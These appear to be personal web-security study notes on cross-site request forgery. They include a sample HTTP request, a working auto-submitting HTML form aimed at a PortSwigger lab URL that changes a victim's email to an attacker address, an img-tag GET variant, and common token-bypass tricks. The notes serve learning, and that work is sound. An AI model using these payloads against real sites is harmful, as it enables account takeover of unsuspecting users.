---
description: Cross-site request forgery (also known as CSRF).
---

# CSRF

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application. It can cause a victim to carry out and unintended action, like changing email address or chaning passwords. Tree conditions needed:

* A relevevant action: Like changen email or password
* Cookie-based sessions
* No unpredictable request parameters like value of a password.&#x20;

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=mczen@user.com
```

Based on this we can create a simple web page

```html
<html>
	<head>
		<title>CSRF-2</title>
	</head>
	<body>
		<form action="https://0a2200ad04963c7981de6661005c00c2.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="zen@evil.com">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

This wil change the user's emailaddress and can be delivered like

```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

#### Common flaws in CSRT tokens

* Apps might validate tokens in POST requests but not in GET requests.
* Remove parameter and value, could bypass validation.
* Sometimes tokens not checked to which users its linked. Accepts any valid token.
